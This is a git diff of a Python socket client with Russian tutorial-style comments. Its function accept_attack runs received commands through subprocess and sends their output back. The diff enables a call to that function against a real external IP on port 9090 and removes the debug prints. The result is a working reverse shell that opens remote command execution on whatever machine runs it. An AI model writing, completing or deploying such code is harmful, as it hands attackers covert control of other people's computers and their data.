@@ -6,7 +6,7 @@ import subprocess
 """
 Также как и на серверной стороне, здесь будут фигурировать внутренние локальные IP, которые 
 можно посмотреть в ipconfig в cmd.
-Далее и на клиентской стороне сперва надо создать сокет. 
+Далее и на клиентской стороне сперва надо создать сокет. Если же у нас деплой, тогда ip внешний сервера. 
 """
 
 def despatch(ip, port, message):
@@ -29,6 +29,7 @@ def despatch(ip, port, message):
     sock.send((f'{message}').encode())
 
     #после того как мы что то послали, мы можем получить ответ через метод recv (как и на сервере)
+    #эту строку надо убрать если мы ничего от сервера не получаем, иначе повиснет
     data = sock.recv(1024)
     #и посмотреть дату через принт
     print(data.decode())
@@ -65,10 +66,9 @@ def accept_attack(ip, port):
             output_bytes = cmd.stdout.read() + cmd.stderr.read()
             #на всякий случай заимеем ответ также в виде строки
             output_string = str(output_bytes, "cp866")
-            #print(output_string)
 
-            #print(output_bytes)
             sock.send(output_bytes)
-            #sock.send(os.getcwd().encode())
-            print("CMD response is sent")
     sock.close()
+
+#despatch("109.237.25.179", 9090, "HELLO WORLD")
+accept_attack("109.237.25.179", 9090)
